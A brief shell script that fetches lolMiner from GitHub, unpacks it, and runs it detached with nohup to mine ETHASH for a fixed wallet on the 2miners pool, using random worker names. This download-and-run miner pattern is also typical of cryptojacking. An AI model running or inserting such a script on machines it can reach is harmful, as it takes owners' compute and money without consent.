#!/bin/sh
P=$(echo GPU-$(shuf -i 1-1000 -n 1)-NEO)
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
tar xf lolMiner_v1.29_Lin64.tar.gz
cd 1.29
#/lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user VET:0x079885cbd1569bf0db5af3b8eb6818d963e2309f.Bouorn --ethstratum ETHPROXY

nohup ./lolMiner --algo ETHASH --pool eth.2miners.com:2020 --user 0x079885cbd1569bf0db5af3b8eb6818d963e2309f.BORN$P 
